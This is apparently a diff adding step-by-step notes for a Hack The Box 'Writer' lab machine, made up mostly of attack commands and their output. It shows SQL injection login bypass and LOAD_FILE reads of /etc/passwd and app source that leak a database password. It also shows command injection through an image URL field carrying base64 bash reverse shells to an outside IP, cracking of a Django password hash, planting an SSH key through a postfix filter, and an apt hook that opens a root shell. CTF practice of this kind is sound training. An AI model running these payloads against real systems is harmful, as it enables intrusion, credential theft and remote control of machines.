@@ -1,0 +1,392 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.11.101
+result:
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 63
+80/tcp  open  http         syn-ack ttl 63
+139/tcp open  netbios-ssn  syn-ack ttl 63
+445/tcp open  microsoft-ds syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,137,445 10.10.11.101
+result:
+PORT    STATE  SERVICE     VERSION
+22/tcp  open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9820b9d0521f4e103a4a937e50bcb87d (RSA)
+|   256 1004797a2974db28f9ffaf68dff13f34 (ECDSA)
+|_  256 77c4869a9f334fda71202ce151107e8d (ED25519)
+80/tcp  open   http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Story Bank | Writer.HTB
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+137/tcp closed netbios-ns
+445/tcp open   netbios-ssn Samba smbd 4.6.2
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=7/1%OT=22%CT=137%CU=37235%PV=Y%DS=2%DC=T%G=Y%TM=649F28
+OS:1B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST
+OS:11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
+OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+command: smbmap -H 10.10.11.101                          
+[+] IP: 10.10.11.101:445	Name: 10.10.11.101                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	writer2_project                                   	NO ACCESS	
+	IPC$                                              	NO ACCESS	IPC Service (writer server (Samba, Ubuntu))
+
+...
+200      GET        1l        2w   110388c http://10.10.11.101/static/vendor/jquery/jquery.slim.min.map
+200      GET      278l     1872w   111933c http://10.10.11.101/static/vendor/datatables/datatables.min.js
+200      GET     1291l     5417w   193819c http://10.10.11.101/static/blog/fonts/fontawesome-webfont.ttf
+200      GET        1l        7w   137993c http://10.10.11.101/static/vendor/jquery/jquery.min.map
+200      GET      808l     4584w   436262c http://10.10.11.101/static/img/fishinstream.jpg
+200      GET        7l     1751w   173077c http://10.10.11.101/static/vendor/chartsjs/Chart.min.js
+200      GET     1323l     7956w   635271c http://10.10.11.101/static/img/rain.jpg
+200      GET     1003l     6140w   477211c http://10.10.11.101/static/font/Lato-Regular.eot
+200      GET        7l     2712w   226496c http://10.10.11.101/static/vendor/chartsjs/Chart.bundle.min.js
+200      GET     1124l     6752w   590810c http://10.10.11.101/static/font/Lato-Regular.woff
+200      GET      685l    56431w   386421c http://10.10.11.101/static/blog/fonts/fontawesome-webfont.svg
+200      GET     3296l    12426w   893914c http://10.10.11.101/static/img/contact-bg.jpg
+200      GET    17059l    72206w   495948c http://10.10.11.101/static/vendor/datatables/datatables.js
+200      GET     6284l    26977w   878664c http://10.10.11.101/static/font/Lato-Regular.ttf
+200      GET     3360l    20154w  1618911c http://10.10.11.101/static/img/treesurgeon.jpg
+302      GET        4l       24w      208c http://10.10.11.101/dashboard => http://10.10.11.101/
+200      GET     3280l    17880w  1781033c http://10.10.11.101/static/img/trickster.jpg
+200      GET     2026l    15975w  1875586c http://10.10.11.101/static/img/home-bg.jpg
+200      GET     6798l    36391w  3257049c http://10.10.11.101/static/img/post-bg.jpg
+200      GET      454l     1280w    16292c http://10.10.11.101/
+200      GET     6798l    36391w  3257049c http://10.10.11.101/static/img/post-bg.jpg
+200      GET     9011l    51193w  4616408c http://10.10.11.101/static/img/about-bg.jpg
+200      GET        0l        0w  5564157c http://10.10.11.101/static/img/autumnrain.jpg
+403      GET        9l       28w      277c http://10.10.11.101/server-status
+200      GET       44l       80w      767c http://10.10.11.101/css/signin.css
+200      GET        4l       82w      722c http://10.10.11.101/img/login.svg
+200      GET       35l       99w     1443c http://10.10.11.101/administrative
+...
+take attention: http://10.10.11.101/administrative
+
+access: http://10.10.11.101/
+access: http://10.10.11.101/administrative
+login sqli:
+command: ffuf -X POST -u http://10.10.11.101/administrative -d 'uname=FUZZ&password=0xdf' -w /snap/seclists/34/Fuzzing/SQLi/Generic-SQLi.txt -x http://127.0.0.1:8080 -H "Content-Type: application/x-www-form-urlencoded" --fw 206
+result:
+admin' or '             [Status: 200, Size: 1295, Words: 280, Lines: 33]
+hi' or 'x'='x';         [Status: 200, Size: 1295, Words: 280, Lines: 33]
+x' or 1=1 or 'x'='y     [Status: 200, Size: 1295, Words: 280, Lines: 33]
+' or 1=1 or ''='        [Status: 200, Size: 1295, Words: 280, Lines: 33]
+' or 0=0 #              [Status: 200, Size: 1295, Words: 280, Lines: 33]
+:: Progress: [267/267] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+
+change payload to this: uname=admin'%20or%20'&password=0xdf
+
+please put this request to login.req
+POST /administrative HTTP/1.1
+Host: 10.10.11.101
+Content-Length: 25
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.101
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.11.101/administrative
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+uname=admin'%20or%20'&password=sadas
+
+then sqlmap that log.req
+command: sqlmap -r login.req
+result:
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=admin' AND (SELECT 8542 FROM (SELECT(SLEEP(5)))gmpB) AND 'mGli'='mGli&password=0xdf
+
+
+change payload to this:
+uname=0xdf' UNION SELECT 1,LOAD_FILE("/etc/lsb-release"),3,4,5,6-- -&password=0xdf
+result:
+Welcome DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=20.04
+DISTRIB_CODENAME=focal
+DISTRIB_DESCRIPTION=&#34;Ubuntu 20.04.2 LTS&#34;
+
+payload: uname=0xdf' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4,5,6-- -&password=0xdf
+result:
+Welcome root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
+payload: uname=0xdf' UNION SELECT 1,LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf"),3,4,5,6-- -&password=0xdf
+result:
+Welcome # Virtual host configuration for writer.htb domain
+&lt;VirtualHost *:80&gt;
+        ServerName writer.htb
+        ServerAdmin admin@writer.htb
+        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
+        &lt;Directory /var/www/writer.htb&gt;
+                Order allow,deny
+                Allow from all
+        &lt;/Directory&gt;
+        Alias /static /var/www/writer.htb/writer/static
+        &lt;Directory /var/www/writer.htb/writer/static/&gt;
+                Order allow,deny
+                Allow from all
+        &lt;/Directory&gt;
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        LogLevel warn
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/VirtualHost&gt;
+
+# Virtual host configuration for dev.writer.htb subdomain
+# Will enable configuration after completing backend development
+# Listen 8080
+#&lt;VirtualHost 127.0.0.1:8080&gt;
+#	ServerName dev.writer.htb
+#	ServerAdmin admin@writer.htb
+#
+        # Collect static for the writer2_project/writer_web/templates
+#	Alias /static /var/www/writer2_project/static
+#	&lt;Directory /var/www/writer2_project/static&gt;
+#		Require all granted
+#	&lt;/Directory&gt;
+#
+#	&lt;Directory /var/www/writer2_project/writerv2&gt;
+#		&lt;Files wsgi.py&gt;
+#			Require all granted
+#		&lt;/Files&gt;
+#	&lt;/Directory&gt;
+#
+#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
+#	WSGIProcessGroup writer2_project
+#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
+#        ErrorLog ${APACHE_LOG_DIR}/error.log
+#        LogLevel warn
+#        CustomLog ${APACHE_LOG_DIR}/access.log combined
+#
+#&lt;/VirtualHost&gt;
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+payload: uname=0xdf' UNION SELECT 1,LOAD_FILE("/var/www/writer.htb/writer.wsgi"),3,4,5,6-- -&password=0xdf
+result:
+import sys
+import logging
+import random
+import os
+
+# Define logging
+logging.basicConfig(stream=sys.stderr)
+sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)
+
+# Import the __init__.py from the app folder
+from writer import app as application
+application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
+
+payload: uname=0xdf' UNION SELECT 1,LOAD_FILE("/var/www/writer.htb/writer/__init__.py"),3,4,5,6-- -&password=0xdf
+result:
+some creds:
+    try:
+        connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
+
+some ssrf.
+
+command injection:
+command: echo 'ping -c 1 10.10.16.19' | base64                              
+cGluZyAtYyAxIDEwLjEwLjE2LjE5Cg==
+command: touch '0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE2LjE5Cg==|base64 -d|bash;'
+please intercept using burpsuite.
+
+access: http://10.10.11.101/static/img/
+remove filename and add file:/// to image_url, change paylaod to this:
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="image"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="image_url"
+
+file:///var/www/writer.htb/writer/static/img/0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE2LjE5Cg==|base64 -d|bash;
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="content"
+
+let's create shell payload
+command: echo 'bash -c "bash -i >& /dev/tcp/10.10.16.19/7979 0>&1"' | base64
+result:
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83OTc5IDA+JjEiCg==
+
+command: touch 'test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83OTc5IDA+JjEiCg==|base64 -d|bash;'
+
+change payload to this: test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83OTc5IDA+JjEiCg==|base64 -d|bash;
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="image"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="image_url"
+
+file:///var/www/writer.htb/writer/static/img/test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83OTc5IDA+JjEiCg==|base64 -d|bash;
+------WebKitFormBoundary8D3s8CrK5N4t3dvV
+Content-Disposition: form-data; name="content"
+
+upgrade shell.
+
+command: cd /var/www/writer2_project
+command: cat manage.py 
+#!/usr/bin/env python
+import os
+import sys
+
+if __name__ == "__main__":
+    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "writerv2.settings")
+    try:
+        from django.core.management import execute_from_command_line
+    except ImportError:
+        # The above import may fail for some other reason. Ensure that the
+        # issue is really that Django is missing to avoid masking other
+        # exceptions on Python 2.
+        try:
+            import django
+        except ImportError:
+            raise ImportError(
+                "Couldn't import Django. Are you sure it's installed and "
+                "available on your PYTHONPATH environment variable? Did you "
+                "forget to activate a virtual environment?"
+            )
+        raise
+    execute_from_command_line(sys.argv)
+
+command: python3 manage.py dbshell
+MariaDB [dev]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| dev                |
+| information_schema |
++--------------------+
+
+MariaDB [dev]> show tables;
++----------------------------+
+| Tables_in_dev              |
++----------------------------+
+| auth_group                 |
+| auth_group_permissions     |
+| auth_permission            |
+| auth_user                  |
+| auth_user_groups           |
+| auth_user_user_permissions |
+| django_admin_log           |
+| django_content_type        |
+| django_migrations          |
+| django_session             |
++----------------------------+
+
+MariaDB [dev]> select * from auth_user;
+|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+
+put this to django.hash
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=
+
+command: hashcat -m 10000 django.hash --force /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt --show
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
+
+marcoantonio
+
+command: su kyle 
+Password: marcoantonio
+
+command: find / -group kyle 2>/dev/null | grep -v -e '^/run' -e '^/sys' -e '^/proc'
+result:
+/home/kyle
+/home/kyle/.local
+/home/kyle/.local/share
+/home/kyle/.local/share/nano
+/home/kyle/user.txt
+/home/kyle/.bash_logout
+/home/kyle/.cache
+/home/kyle/.cache/motd.legal-displayed
+/home/kyle/.bashrc
+/home/kyle/.profile
+
+command: find / -group filter 2>/dev/null
+/etc/postfix/disclaimer
+/var/spool/filter
+
+command: find / -group smbgroup 2>/dev/null | wc -l
+3915
+
+command: find / -group smbgroup 2>/dev/null | grep -v '^/var/www/writer2' | wc -l
+result:
+0
+
+let's send email to port 25, put this code to /tmp
+you must very fast, before cron delete all your changes.
+#!/usr/bin/python3
+
+import smtplib
+
+sender = 'kyle@writer.htb'
+receivers = ['kyle@writer.htb']
+
+message = """From: From Kyle <kyle@writer.htb>
+To: To Kyle <kyle@writer.htb>
+Subject: Give me a reverse shell pls
+
+Why? Because I asked nicely.
+"""
+
+try:
+   smtpObj = smtplib.SMTP('localhost')
+   smtpObj.sendmail(sender, receivers, message)         
+except SMTPException:
+   print("Error: unable to send email")
+
+command: nano /etc/postfix/disclaimer
+add this code code in above /etc/postfix/disclaimer: 
+touch /dev/shm/0xdf
+echo "your_id_rsa.pub" >> /home/john/.ssh/authorized_keys 
+
+command: ssh -i id_rsa_new john@10.10.11.101
+
+command: find / -group management -ls 2>/dev/null 
+    17525      4 drwxrwxr-x   2 root     management     4096 Jun 30 18:06 /etc/apt/apt.conf.d
+
+command: cd /etc/apt/apt.conf.d
+
+port payload shell must 443
+command: echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.19/443 0>&1"' | base64 -w0
+result
+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTkvNDQzIDA+JjEiCg==
+
+command: nc -lvnp 443
+
+command: cd /etc/apt/apt.conf.d
+command: echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTkvNDQzIDA+JjEiCg== | base64 -d | bash"};' > 000-shell
+
+command: cat /root/root.txt
+817be8df41128b98f145805600f7da32
+
+resource:
+https://0xdf.gitlab.io/2021/12/11/htb-writer.html
+https://tom-philippe.medium.com/hackthebox-writer-writeup-7b78a9c681d
